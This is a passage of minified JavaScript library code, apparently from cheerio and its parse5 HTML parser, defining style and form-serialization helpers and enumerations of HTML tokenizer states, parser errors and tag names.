s[t]:r!=null&&(s[t]=r),e.attribs.style=Ho(s)}else if(typeof t=="object"){const s=Object.keys(t);for(let r=0;r<s.length;r++){const p=s[r];Kn(e,p,t[p],r)}}}function Yn(e,t){if(!e||!v(e))return;const a=jo(e.attribs.style);if(typeof t=="string")return a[t];if(Array.isArray(t)){const n={};for(const s of t)a[s]!=null&&(n[s]=a[s]);return n}return a}function Ho(e){return Object.keys(e).reduce((t,a)=>`${t}${t?" ":""}${a}: ${e[a]};`,"")}function jo(e){if(e=(e||"").trim(),!e)return{};const t={};let a;for(const n of e.split(";")){const s=n.indexOf(":");if(s<1||s===n.length-1){const r=n.trimEnd();r.length>0&&a!==void 0&&(t[a]+=`;${r}`)}else a=n.slice(0,s).trim(),t[a]=n.slice(s+1).trim()}return t}const Io=Object.freeze(Object.defineProperty({__proto__:null,css:Do},Symbol.toStringTag,{value:"Module"})),Ja="input,select,textarea,keygen",Vo=/%20/g,Fa=/\r?\n/g;function Uo(){return this.serializeArray().map(a=>`${encodeURIComponent(a.name)}=${encodeURIComponent(a.value)}`).join("&").replace(Vo,"+")}function Jo(){return this.map((e,t)=>{const a=this._make(t);return v(t)&&t.name==="form"?a.find(Ja).toArray():a.filter(Ja).toArray()}).filter('[name!=""]:enabled:not(:submit, :button, :image, :reset, :file):matches([checked], :not(:checkbox, :radio))').map((e,t)=>{var a;const n=this._make(t),s=n.attr("name"),r=(a=n.val())!==null&&a!==void 0?a:"";return Array.isArray(r)?r.map(p=>({name:s,value:p.replace(Fa,`\r
`)})):{name:s,value:r.replace(Fa,`\r
`)}}).toArray()}const Fo=Object.freeze(Object.defineProperty({__proto__:null,serialize:Uo,serializeArray:Jo},Symbol.toStringTag,{value:"Module"}));function Bo(e){var t;return typeof e=="string"?{selector:e,value:"textContent"}:{selector:e.selector,value:(t=e.value)!==null&&t!==void 0?t:"textContent"}}function qo(e){const t={};for(const a in e){const n=e[a],s=Array.isArray(n),{selector:r,value:p}=Bo(s?n[0]:n),o=typeof p=="function"?p:typeof p=="string"?l=>this._make(l).prop(p):l=>this._make(l).extract(p);if(s)t[a]=this._findBySelector(r,Number.POSITIVE_INFINITY).map((l,c)=>o(c,a,t)).get();else{const l=this._findBySelector(r,1);t[a]=l.length>0?o(l[0],a,t):void 0}}return t}const zo=Object.freeze(Object.defineProperty({__proto__:null,extract:qo},Symbol.toStringTag,{value:"Module"}));class Tt{constructor(t,a,n){if(this.length=0,this.options=n,this._root=a,t){for(let s=0;s<t.length;s++)this[s]=t[s];this.length=t.length}}}Tt.prototype.cheerio="[cheerio object]";Tt.prototype.splice=Array.prototype.splice;Tt.prototype[Symbol.iterator]=Array.prototype[Symbol.iterator];Object.assign(Tt.prototype,Zr,wo,Ao,Io,Fo,zo);var Ba;(function(e){e[e.EOF=-1]="EOF",e[e.NULL=0]="NULL",e[e.TABULATION=9]="TABULATION",e[e.CARRIAGE_RETURN=13]="CARRIAGE_RETURN",e[e.LINE_FEED=10]="LINE_FEED",e[e.FORM_FEED=12]="FORM_FEED",e[e.SPACE=32]="SPACE",e[e.EXCLAMATION_MARK=33]="EXCLAMATION_MARK",e[e.QUOTATION_MARK=34]="QUOTATION_MARK",e[e.AMPERSAND=38]="AMPERSAND",e[e.APOSTROPHE=39]="APOSTROPHE",e[e.HYPHEN_MINUS=45]="HYPHEN_MINUS",e[e.SOLIDUS=47]="SOLIDUS",e[e.DIGIT_0=48]="DIGIT_0",e[e.DIGIT_9=57]="DIGIT_9",e[e.SEMICOLON=59]="SEMICOLON",e[e.LESS_THAN_SIGN=60]="LESS_THAN_SIGN",e[e.EQUALS_SIGN=61]="EQUALS_SIGN",e[e.GREATER_THAN_SIGN=62]="GREATER_THAN_SIGN",e[e.QUESTION_MARK=63]="QUESTION_MARK",e[e.LATIN_CAPITAL_A=65]="LATIN_CAPITAL_A",e[e.LATIN_CAPITAL_Z=90]="LATIN_CAPITAL_Z",e[e.RIGHT_SQUARE_BRACKET=93]="RIGHT_SQUARE_BRACKET",e[e.GRAVE_ACCENT=96]="GRAVE_ACCENT",e[e.LATIN_SMALL_A=97]="LATIN_SMALL_A",e[e.LATIN_SMALL_Z=122]="LATIN_SMALL_Z"})(Ba||(Ba={}));var qa;(function(e){e.controlCharacterInInputStream="control-character-in-input-stream",e.noncharacterInInputStream="noncharacter-in-input-stream",e.surrogateInInputStream="surrogate-in-input-stream",e.nonVoidHtmlElementStartTagWithTrailingSolidus="non-void-html-element-start-tag-with-trailing-solidus",e.endTagWithAttributes="end-tag-with-attributes",e.endTagWithTrailingSolidus="end-tag-with-trailing-solidus",e.unexpectedSolidusInTag="unexpected-solidus-in-tag",e.unexpectedNullCharacter="unexpected-null-character",e.unexpectedQuestionMarkInsteadOfTagName="unexpected-question-mark-instead-of-tag-name",e.invalidFirstCharacterOfTagName="invalid-first-character-of-tag-name",e.unexpectedEqualsSignBeforeAttributeName="unexpected-equals-sign-before-attribute-name",e.missingEndTagName="missing-end-tag-name",e.unexpectedCharacterInAttributeName="unexpected-character-in-attribute-name",e.unknownNamedCharacterReference="unknown-named-character-reference",e.missingSemicolonAfterCharacterReference="missing-semicolon-after-character-reference",e.unexpectedCharacterAfterDoctypeSystemIdentifier="unexpected-character-after-doctype-system-identifier",e.unexpectedCharacterInUnquotedAttributeValue="unexpected-character-in-unquoted-attribute-value",e.eofBeforeTagName="eof-before-tag-name",e.eofInTag="eof-in-tag",e.missingAttributeValue="missing-attribute-value",e.missingWhitespaceBetweenAttributes="missing-whitespace-between-attributes",e.missingWhitespaceAfterDoctypePublicKeyword="missing-whitespace-after-doctype-public-keyword",e.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers="missing-whitespace-between-doctype-public-and-system-identifiers",e.missingWhitespaceAfterDoctypeSystemKeyword="missing-whitespace-after-doctype-system-keyword",e.missingQuoteBeforeDoctypePublicIdentifier="missing-quote-before-doctype-public-identifier",e.missingQuoteBeforeDoctypeSystemIdentifier="missing-quote-before-doctype-system-identifier",e.missingDoctypePublicIdentifier="missing-doctype-public-identifier",e.missingDoctypeSystemIdentifier="missing-doctype-system-identifier",e.abruptDoctypePublicIdentifier="abrupt-doctype-public-identifier",e.abruptDoctypeSystemIdentifier="abrupt-doctype-system-identifier",e.cdataInHtmlContent="cdata-in-html-content",e.incorrectlyOpenedComment="incorrectly-opened-comment",e.eofInScriptHtmlCommentLikeText="eof-in-script-html-comment-like-text",e.eofInDoctype="eof-in-doctype",e.nestedComment="nested-comment",e.abruptClosingOfEmptyComment="abrupt-closing-of-empty-comment",e.eofInComment="eof-in-comment",e.incorrectlyClosedComment="incorrectly-closed-comment",e.eofInCdata="eof-in-cdata",e.absenceOfDigitsInNumericCharacterReference="absence-of-digits-in-numeric-character-reference",e.nullCharacterReference="null-character-reference",e.surrogateCharacterReference="surrogate-character-reference",e.characterReferenceOutsideUnicodeRange="character-reference-outside-unicode-range",e.controlCharacterReference="control-character-reference",e.noncharacterCharacterReference="noncharacter-character-reference",e.missingWhitespaceBeforeDoctypeName="missing-whitespace-before-doctype-name",e.missingDoctypeName="missing-doctype-name",e.invalidCharacterSequenceAfterDoctypeName="invalid-character-sequence-after-doctype-name",e.duplicateAttribute="duplicate-attribute",e.nonConformingDoctype="non-conforming-doctype",e.missingDoctype="missing-doctype",e.misplacedDoctype="misplaced-doctype",e.endTagWithoutMatchingOpenElement="end-tag-without-matching-open-element",e.closingOfElementWithOpenChildElements="closing-of-element-with-open-child-elements",e.disallowedContentInNoscriptInHead="disallowed-content-in-noscript-in-head",e.openElementsLeftAfterEof="open-elements-left-after-eof",e.abandonedHeadElementChild="abandoned-head-element-child",e.misplacedStartTagForHeadElement="misplaced-start-tag-for-head-element",e.nestedNoscriptInHead="nested-noscript-in-head",e.eofInElementThatCanContainOnlyText="eof-in-element-that-can-contain-only-text"})(qa||(qa={}));var za;(function(e){e[e.CHARACTER=0]="CHARACTER",e[e.NULL_CHARACTER=1]="NULL_CHARACTER",e[e.WHITESPACE_CHARACTER=2]="WHITESPACE_CHARACTER",e[e.START_TAG=3]="START_TAG",e[e.END_TAG=4]="END_TAG",e[e.COMMENT=5]="COMMENT",e[e.DOCTYPE=6]="DOCTYPE",e[e.EOF=7]="EOF",e[e.HIBERNATION=8]="HIBERNATION"})(za||(za={}));var V;(function(e){e.HTML="http://www.w3.org/1999/xhtml",e.MATHML="http://www.w3.org/1998/Math/MathML",e.SVG="http://www.w3.org/2000/svg",e.XLINK="http://www.w3.org/1999/xlink",e.XML="http://www.w3.org/XML/1998/namespace",e.XMLNS="http://www.w3.org/2000/xmlns/"})(V||(V={}));var $a;(function(e){e.TYPE="type",e.ACTION="action",e.ENCODING="encoding",e.PROMPT="prompt",e.NAME="name",e.COLOR="color",e.FACE="face",e.SIZE="size"})($a||($a={}));var Ga;(function(e){e.NO_QUIRKS="no-quirks",e.QUIRKS="quirks",e.LIMITED_QUIRKS="limited-quirks"})(Ga||(Ga={}));var x;(function(e){e.A="a",e.ADDRESS="address",e.ANNOTATION_XML="annotation-xml",e.APPLET="applet",e.AREA="area",e.ARTICLE="article",e.ASIDE="aside",e.B="b",e.BASE="base",e.BASEFONT="basefont",e.BGSOUND="bgsound",e.BIG="big",e.BLOCKQUOTE="blockquote",e.BODY="body",e.BR="br",e.BUTTON="button",e.CAPTION="caption",e.CENTER="center",e.CODE="code",e.COL="col",e.COLGROUP="colgroup",e.DD="dd",e.DESC="desc",e.DETAILS="details",e.DIALOG="dialog",e.DIR="dir",e.DIV="div",e.DL="dl",e.DT="dt",e.EM="em",e.EMBED="embed",e.FIELDSET="fieldset",e.FIGCAPTION="figcaption",e.FIGURE="figure",e.FONT="font",e.FOOTER="footer",e.FOREIGN_OBJECT="foreignObject",e.FORM="form",e.FRAME="frame",e.FRAMESET="frameset",e.H1="h1",e.H2="h2",e.H3="h3",e.H4="h4",e.H5="h5",e.H6="h6",e.HEAD="head",e.HEADER="header",e.HGROUP="hgroup",e.HR="hr",e.HTML="html",e.I="i",e.IMG="img",e.IMAGE="image",e.INPUT="input",e.IFRAME="iframe",e.KEYGEN="keygen",e.LABEL="label",e.LI="li",e.LINK="link",e.LISTING="listing",e.MAIN="main",e.MALIGNMARK="malignmark",e.MARQUEE="marquee",e.MATH="math",e.MENU="menu",e.META="meta",e.MGLYPH="mglyph",e.MI="mi",e.MO="mo",e.MN="mn",e.MS="ms",e.MTEXT="mtext",e.NAV="nav",e.NOBR="nobr",e.NOFRAMES="noframes",e.NOEMBED="noembed",e.NOSCRIPT="noscript",e.OBJECT="object",e.OL="ol",e.OPTGROUP="optgroup",e.OPTION="option",e.P="p",e.PARAM="param",e.PLAINTEXT="plaintext",e.PRE="pre",e.RB="rb",e.RP="rp",e.RT="rt",e.RTC="rtc",e.RUBY="ruby",e.S="s",e.SCRIPT="script",e.SEARCH="search",e.SECTION="section",e.SELECT="select",e.SOURCE="source",e.SMALL="small",e.SPAN="span",e.STRIKE="strike",e.STRONG="strong",e.STYLE="style",e.SUB="sub",e.SUMMARY="summary",e.SUP="sup",e.TABLE="table",e.TBODY="tbody",e.TEMPLATE="template",e.TEXTAREA="textarea",e.TFOOT="tfoot",e.TD="td",e.TH="th",e.THEAD="thead",e.TITLE="title",e.TR="tr",e.TRACK="track",e.TT="tt",e.U="u",e.UL="ul",e.SVG="svg",e.VAR="var",e.WBR="wbr",e.XMP="xmp"})(x||(x={}));var d;(function(e){e[e.UNKNOWN=0]="UNKNOWN",e[e.A=1]="A",e[e.ADDRESS=2]="ADDRESS",e[e.ANNOTATION_XML=3]="ANNOTATION_XML",e[e.APPLET=4]="APPLET",e[e.AREA=5]="AREA",e[e.ARTICLE=6]="ARTICLE",e[e.ASIDE=7]="ASIDE",e[e.B=8]="B",e[e.BASE=9]="BASE",e[e.BASEFONT=10]="BASEFONT",e[e.BGSOUND=11]="BGSOUND",e[e.BIG=12]="BIG",e[e.BLOCKQUOTE=13]="BLOCKQUOTE",e[e.BODY=14]="BODY",e[e.BR=15]="BR",e[e.BUTTON=16]="BUTTON",e[e.CAPTION=17]="CAPTION",e[e.CENTER=18]="CENTER",e[e.CODE=19]="CODE",e[e.COL=20]="COL",e[e.COLGROUP=21]="COLGROUP",e[e.DD=22]="DD",e[e.DESC=23]="DESC",e[e.DETAILS=24]="DETAILS",e[e.DIALOG=25]="DIALOG",e[e.DIR=26]="DIR",e[e.DIV=27]="DIV",e[e.DL=28]="DL",e[e.DT=29]="DT",e[e.EM=30]="EM",e[e.EMBED=31]="EMBED",e[e.FIELDSET=32]="FIELDSET",e[e.FIGCAPTION=33]="FIGCAPTION",e[e.FIGURE=34]="FIGURE",e[e.FONT=35]="FONT",e[e.FOOTER=36]="FOOTER",e[e.FOREIGN_OBJECT=37]="FOREIGN_OBJECT",e[e.FORM=38]="FORM",e[e.FRAME=39]="FRAME",e[e.FRAMESET=40]="FRAMESET",e[e.H1=41]="H1",e[e.H2=42]="H2",e[e.H3=43]="H3",e[e.H4=44]="H4",e[e.H5=45]="H5",e[e.H6=46]="H6",e[e.HEAD=47]="HEAD",e[e.HEADER=48]="HEADER",e[e.HGROUP=49]="HGROUP",e[e.HR=50]="HR",e[e.HTML=51]="HTML",e[e.I=52]="I",e[e.IMG=53]="IMG",e[e.IMAGE=54]="IMAGE",e[e.INPUT=55]="INPUT",e[e.IFRAME=56]="IFRAME",e[e.KEYGEN=57]="KEYGEN",e[e.LABEL=58]="LABEL",e[e.LI=59]="LI",e[e.LINK=60]="LINK",e[e.LISTING=61]="LISTING",e[e.MAIN=62]="MAIN",e[e.MALIGNMARK=63]="MALIGNMARK",e[e.MARQUEE=64]="MARQUEE",e[e.MATH=65]="MATH",e[e.MENU=66]="MENU",e[e.META=67]="META",e[e.MGLYPH=68]="MGLYPH",e[e.MI=69]="MI",e[e.MO=70]="MO",e[e.MN=71]="MN",e[e.MS=72]="MS",e[e.MTEXT=73]="MTEXT",e[e.NAV=74]="NAV",e[e.NOBR=75]="NOBR",e[e.NOFRAMES=76]="NOFRAMES",e[e.NOEMBED=77]="NOEMBED",e[e.NOSCRIPT=78]="NOSCRIPT",e[e.OBJECT=79]="OBJECT",e[e.OL=80]="OL",e[e.OPTGROUP=81]="OPTGROUP",e[e.OPTION=82]="OPTION",e[e.P=83]="P",e[e.PARAM=84]="PARAM",e[e.PLAINTEXT=85]="PLAINTEXT",e[e.PRE=86]="PRE",e[e.RB=87]="RB",e[e.RP=88]="RP",e[e.RT=89]="RT",e[e.RTC=90]="RTC",e[e.RUBY=91]="RUBY",e[e.S=92]="S",e[e.SCRIPT=93]="SCRIPT",e[e.SEARCH=94]="SEARCH",e[e.SECTION=95]="SECTION",e[e.SELECT=96]="SELECT",e[e.SOURCE=97]="SOURCE",e[e.SMALL=98]="SMALL",e[e.SPAN=99]="SPAN",e[e.STRIKE=100]="STRIKE",e[e.STRONG=101]="STRONG",e[e.STYLE=102]="STYLE",e[e.SUB=103]="SUB",e[e.SUMMARY=104]="SUMMARY",e[e.SUP=105]="SUP",e[e.TABLE=106]="TABLE",e[e.TBODY=107]="TBODY",e[e.TEMPLATE=108]="TEMPLATE",e[e.TEXTAREA=109]="TEXTAREA",e[e.TFOOT=110]="TFOOT",e[e.TD=111]="TD",e[e.TH=112]="TH",e[e.THEAD=113]="THEAD",e[e.TITLE=114]="TITLE",e[e.TR=115]="TR",e[e.TRACK=116]="TRACK",e[e.TT=117]="TT",e[e.U=118]="U",e[e.UL=119]="UL",e[e.SVG=120]="SVG",e[e.VAR=121]="VAR",e[e.WBR=122]="WBR",e[e.XMP=123]="XMP"})(d||(d={}));x.A,d.A,x.ADDRESS,d.ADDRESS,x.ANNOTATION_XML,d.ANNOTATION_XML,x.APPLET,d.APPLET,x.AREA,d.AREA,x.ARTICLE,d.ARTICLE,x.ASIDE,d.ASIDE,x.B,d.B,x.BASE,d.BASE,x.BASEFONT,d.BASEFONT,x.BGSOUND,d.BGSOUND,x.BIG,d.BIG,x.BLOCKQUOTE,d.BLOCKQUOTE,x.BODY,d.BODY,x.BR,d.BR,x.BUTTON,d.BUTTON,x.CAPTION,d.CAPTION,x.CENTER,d.CENTER,x.CODE,d.CODE,x.COL,d.COL,x.COLGROUP,d.COLGROUP,x.DD,d.DD,x.DESC,d.DESC,x.DETAILS,d.DETAILS,x.DIALOG,d.DIALOG,x.DIR,d.DIR,x.DIV,d.DIV,x.DL,d.DL,x.DT,d.DT,x.EM,d.EM,x.EMBED,d.EMBED,x.FIELDSET,d.FIELDSET,x.FIGCAPTION,d.FIGCAPTION,x.FIGURE,d.FIGURE,x.FONT,d.FONT,x.FOOTER,d.FOOTER,x.FOREIGN_OBJECT,d.FOREIGN_OBJECT,x.FORM,d.FORM,x.FRAME,d.FRAME,x.FRAMESET,d.FRAMESET,x.H1,d.H1,x.H2,d.H2,x.H3,d.H3,x.H4,d.H4,x.H5,d.H5,x.H6,d.H6,x.HEAD,d.HEAD,x.HEADER,d.HEADER,x.HGROUP,d.HGROUP,x.HR,d.HR,x.HTML,d.HTML,x.I,d.I,x.IMG,d.IMG,x.IMAGE,d.IMAGE,x.INPUT,d.INPUT,x.IFRAME,d.IFRAME,x.KEYGEN,d.KEYGEN,x.LABEL,d.LABEL,x.LI,d.LI,x.LINK,d.LINK,x.LISTING,d.LISTING,x.MAIN,d.MAIN,x.MALIGNMARK,d.MALIGNMARK,x.MARQUEE,d.MARQUEE,x.MATH,d.MATH,x.MENU,d.MENU,x.META,d.META,x.MGLYPH,d.MGLYPH,x.MI,d.MI,x.MO,d.MO,x.MN,d.MN,x.MS,d.MS,x.MTEXT,d.MTEXT,x.NAV,d.NAV,x.NOBR,d.NOBR,x.NOFRAMES,d.NOFRAMES,x.NOEMBED,d.NOEMBED,x.NOSCRIPT,d.NOSCRIPT,x.OBJECT,d.OBJECT,x.OL,d.OL,x.OPTGROUP,d.OPTGROUP,x.OPTION,d.OPTION,x.P,d.P,x.PARAM,d.PARAM,x.PLAINTEXT,d.PLAINTEXT,x.PRE,d.PRE,x.RB,d.RB,x.RP,d.RP,x.RT,d.RT,x.RTC,d.RTC,x.RUBY,d.RUBY,x.S,d.S,x.SCRIPT,d.SCRIPT,x.SEARCH,d.SEARCH,x.SECTION,d.SECTION,x.SELECT,d.SELECT,x.SOURCE,d.SOURCE,x.SMALL,d.SMALL,x.SPAN,d.SPAN,x.STRIKE,d.STRIKE,x.STRONG,d.STRONG,x.STYLE,d.STYLE,x.SUB,d.SUB,x.SUMMARY,d.SUMMARY,x.SUP,d.SUP,x.TABLE,d.TABLE,x.TBODY,d.TBODY,x.TEMPLATE,d.TEMPLATE,x.TEXTAREA,d.TEXTAREA,x.TFOOT,d.TFOOT,x.TD,d.TD,x.TH,d.TH,x.THEAD,d.THEAD,x.TITLE,d.TITLE,x.TR,d.TR,x.TRACK,d.TRACK,x.TT,d.TT,x.U,d.U,x.UL,d.UL,x.SVG,d.SVG,x.VAR,d.VAR,x.WBR,d.WBR,x.XMP,d.XMP;const w=d;V.HTML+"",w.ADDRESS,w.APPLET,w.AREA,w.ARTICLE,w.ASIDE,w.BASE,w.BASEFONT,w.BGSOUND,w.BLOCKQUOTE,w.BODY,w.BR,w.BUTTON,w.CAPTION,w.CENTER,w.COL,w.COLGROUP,w.DD,w.DETAILS,w.DIR,w.DIV,w.DL,w.DT,w.EMBED,w.FIELDSET,w.FIGCAPTION,w.FIGURE,w.FOOTER,w.FORM,w.FRAME,w.FRAMESET,w.H1,w.H2,w.H3,w.H4,w.H5,w.H6,w.HEAD,w.HEADER,w.HGROUP,w.HR,w.HTML,w.IFRAME,w.IMG,w.INPUT,w.LI,w.LINK,w.LISTING,w.MAIN,w.MARQUEE,w.MENU,w.META,w.NAV,w.NOEMBED,w.NOFRAMES,w.NOSCRIPT,w.OBJECT,w.OL,w.P,w.PARAM,w.PLAINTEXT,w.PRE,w.SCRIPT,w.SECTION,w.SELECT,w.SOURCE,w.STYLE,w.SUMMARY,w.TABLE,w.TBODY,w.TD,w.TEMPLATE,w.TEXTAREA,w.TFOOT,w.TH,w.THEAD,w.TITLE,w.TR,w.TRACK,w.UL,w.WBR,w.XMP,V.MATHML+"",w.MI,w.MO,w.MN,w.MS,w.MTEXT,w.ANNOTATION_XML,V.SVG+"",w.TITLE,w.FOREIGN_OBJECT,w.DESC,V.XLINK+"",V.XML+"",V.XMLNS+"";w.H1,w.H2,w.H3,w.H4,w.H5,w.H6;x.STYLE,x.SCRIPT,x.XMP,x.IFRAME,x.NOEMBED,x.NOFRAMES,x.PLAINTEXT;var de;(function(e){e[e.DATA=0]="DATA",e[e.RCDATA=1]="RCDATA",e[e.RAWTEXT=2]="RAWTEXT",e[e.SCRIPT_DATA=3]="SCRIPT_DATA",e[e.PLAINTEXT=4]="PLAINTEXT",e[e.TAG_OPEN=5]="TAG_OPEN",e[e.END_TAG_OPEN=6]="END_TAG_OPEN",e[e.TAG_NAME=7]="TAG_NAME",e[e.RCDATA_LESS_THAN_SIGN=8]="RCDATA_LESS_THAN_SIGN",e[e.RCDATA_END_TAG_OPEN=9]="RCDATA_END_TAG_OPEN",e[e.RCDATA_END_TAG_NAME=10]="RCDATA_END_TAG_NAME",e[e.RAWTEXT_LESS_THAN_SIGN=11]="RAWTEXT_LESS_THAN_SIGN",e[e.RAWTEXT_END_TAG_OPEN=12]="RAWTEXT_END_TAG_OPEN",e[e.RAWTEXT_END_TAG_NAME=13]="RAWTEXT_END_TAG_NAME",e[e.SCRIPT_DATA_LESS_THAN_SIGN=14]="SCRIPT_DATA_LESS_THAN_SIGN",e[e.SCRIPT_DATA_END_TAG_OPEN=15]="SCRIPT_DATA_END_TAG_OPEN",e[e.SCRIPT_DATA_END_TAG_NAME=16]="SCRIPT_DATA_END_TAG_NAME",e[e.SCRIPT_DATA_ESCAPE_START=17]="SCRIPT_DATA_ESCAPE_START",e[e.SCRIPT_DATA_ESCAPE_START_DASH=18]="SCRIPT_DATA_ESCAPE_START_DASH",e[e.SCRIPT_DATA_ESCAPED=19]="SCRIPT_DATA_ESCAPED",e[e.SCRIPT_DATA_ESCAPED_DASH=20]="SCRIPT_DATA_ESCAPED_DASH",e[e.SCRIPT_DATA_ESCAPED_DASH_DASH=21]="SCRIPT_DATA_ESCAPED_DASH_DASH",e[e.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN=22]="SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN",e[e.SCRIPT_DATA_ESCAPED_END_TAG_OPEN=23]="SCRIPT_DATA_ESCAPED_END_TAG_OPEN",e[e.SCRIPT_DATA_ESCAPED_END_TAG_NAME=24]="SCRIPT_DATA_ESCAPED_END_TAG_NAME",e[e.SCRIPT_DATA_DOUBLE_ESCAPE_START=25]="SCRIPT_DATA_DOUBLE_ESCAPE_START",e[e.SCRIPT_DATA_DOUBLE_ESCAPED=26]="SCRIPT_DATA_DOUBLE_ESCAPED",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_DASH=27]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH=28]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN=29]="SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN",e[e.SCRIPT_DATA_DOUBLE_ESCAPE_END=30]="SCRIPT_DATA_DOUBLE_ESCAPE_END",e[e.BEFORE_ATTRIBUTE_NAME=31]="BEFORE_ATTRIBUTE_NAME",e[e.ATTRIBUTE_NAME=32]="ATTRIBUTE_NAME",e[e.AFTER_ATTRIBUTE_NAME=33]="AFTER_ATTRIBUTE_NAME",e[e.BEFORE_ATTRIBUTE_VALUE=34]="BEFORE_ATTRIBUTE_VALUE",e[e.ATTRIBUTE_VALUE_DOUBLE_QUOTED=35]="ATTRIBUTE_VALUE_DOUBLE_QUOTED",e[e.ATTRIBUTE_VALUE_SINGLE_QUOTED=36]="ATTRIBUTE_VALUE_SINGLE_QUOTED",e[e.ATTRIBUTE_VALUE_UNQUOTED=37]="ATTRIBUTE_VALUE_UNQUOTED",e[e.AFTER_ATTRIBUTE_VALUE_QUOTED=38]="AFTER_ATTRIBUTE_VALUE_QUOTED",e[e.SELF_CLOSING_START_TAG=39]="SELF_CLOSING_START_TAG",e[e.BOGUS_COMMENT=40]="BOGUS_COMMENT",e[e.MARKUP_DECLARATION_OPEN=41]="MARKUP_DECLARATION_OPEN",e[e.COMMENT_START=42]="COMMENT_START",e[e.COMMENT_START_DASH=43]="COMMENT_START_DASH",e[e.COMMENT=44]="COMMENT",e[e.COMMENT_LESS_THAN_SIGN=45]="COMMENT_LESS_THAN_SIGN",e[e.COMMENT_LESS_THAN_SIGN_BANG=46]="COMMENT_LESS_THAN_SIGN_BANG",e[e.COMMENT_LESS_THAN_SIGN_BANG_DASH=47]="COMMENT_LESS_THAN_SIGN_BANG_DASH",e[e.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH=48]="COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH",e[e.COMMENT_END_DASH=49]="COMMENT_END_DASH",e[e.COMMENT_END=50]="COMMENT_END",e[e.COMMENT_END_BANG=51]="COMMENT_END_BANG",e[e.DOCTYPE=52]="DOCTYPE",e[e.BEFORE_DOCTYPE_NAME=53]="BEFORE_DOCTYPE_NAME",e[e.DOCTYPE_NAME=54]="DOCTYPE_NAME",e[e.AFTER_DOCTYPE_NAME=55]="AFTER_DOCTYPE_NAME",e[e.AFTER_DOCTYPE_PUBLIC_KEYWORD=56]="AFTER_DOCTYPE_PUBLIC_KEYWORD",e[e.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER=57]="BEFORE_DOCTYPE_PUBLIC_IDENTIFIER",e[e.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED=58]="DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED",e[e.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED=59]="DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED",e[e.AFTER_DOCTYPE_PUBLIC_IDENTIFIER=60]="AFTER_DOCTYPE_PUBLIC_IDENTIFIER",e[e.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS=61]="BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS",e[e.AFTER_DOCTYPE_SYSTEM_KEYWORD=62]="AFTER_DOCTYPE_SYSTEM_KEYWORD",e[e.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER=63]="BEFORE_DOCTYPE_SYSTEM_IDENTIFIER",e[e.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED=64]="DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED",e[e.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED=65]="DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED",e[e.AFTER_DOCTYPE_SYSTEM_IDENTIFIER=66]="AFTER_DOCTYPE_SYSTEM_IDENTIFIER",e[e.BOGUS_DOCTYPE=67]="BOGUS_DOCTYPE",e[e.CDATA_SECTION=68]="CDATA_SECTION",e[e.CDATA_SECTION_BRACKET=69]="CDATA_SECTION_BRACKET",e[e.CDATA_SECTION_END=70]="CDATA_SECTION_END",e[e.CHARACTER_REFERENCE=71]="CHARACTER_REFERENCE",e[e.AMBIGUOUS_AMPERSAND=72]="AMBIGUOUS_AMPERSAND"})(de||(de={}));de.DATA,de.RCDATA,de.RAWTEXT,de.SCRIPT_DATA,de.PLAINTEXT,de.CDATA_SECTION;const $o=new Set([d.DD,d.DT,d.LI,d.OPTGROUP,d.OPTION,d.P,d.RB,d.RP,d.RT,d.RTC]);[...$o,d.CAPTION,d.COLGROUP,d.TBODY,d.TD,d.TFOOT,d.TH,d.THEAD,d.TR];const Qn=new Set([d.APPLET,d.CAPTION,d.HTML,d.MARQUEE,d.OBJECT,d.TABLE,d.TD,d.TEMPLATE,d.TH]);[...Qn,d.OL,d.UL];[...Qn,d.BUTTON];d.ANNOTATION_XML,d.MI,d.MN,d.MO,d.MS,d.MTEXT;d.DESC,d.FOREIGN_OBJECT,d.TITLE;d.TR,d.TEMPLATE,d.HTML;d.TBODY,d.TFOOT,d.THEAD,d.TEMPLATE,d.HTML;d.TABLE,d.TEMPLATE,d.HTML;d.TD,d.TH;var Xt;(function(e){e[e.Marker=0]="Marker",e[e.Element=1]="Element"})(Xt||(Xt={}));Xt.Marker;new Map(["attributeName","attributeType","baseFrequency","baseProfile","calcMode","clipPathUnits","diffuseConstant","edgeMode","filterUnits","glyphRef","gradientTransform","gradientUnits","kernelMatrix","kernelUnitLength","keyPoints","keySplines","keyTimes","lengthAdjust","limitingConeAngle","markerHeight","markerUnits","markerWidth","maskContentUnits","maskUnits","numOctaves","pathLength","patternContentUnits","patternTransform","patternUnits","pointsAtX","pointsAtY","pointsAtZ","preserveAlpha","preserveAspectRatio","primitiveUnits","refX","refY","repeatCount","repeatDur","requiredExtensions","requiredFeatures","specularConstant","specularExponent","spreadMethod","startOffset","stdDeviation","stitchTiles","surfaceScale","systemLanguage","tableValues","targetX","targetY","textLength","viewBox","viewTarget","xChannelSelector","yChannelSelector","zoomAndPan"].map(e=>[e.toLowerCase(),e]));V.XLINK,V.XLINK,V.XLINK,V.XLINK,V.XLINK,V.XLINK,V.XLINK,V.XML,V.XML,V.XMLNS,V.XMLNS;new 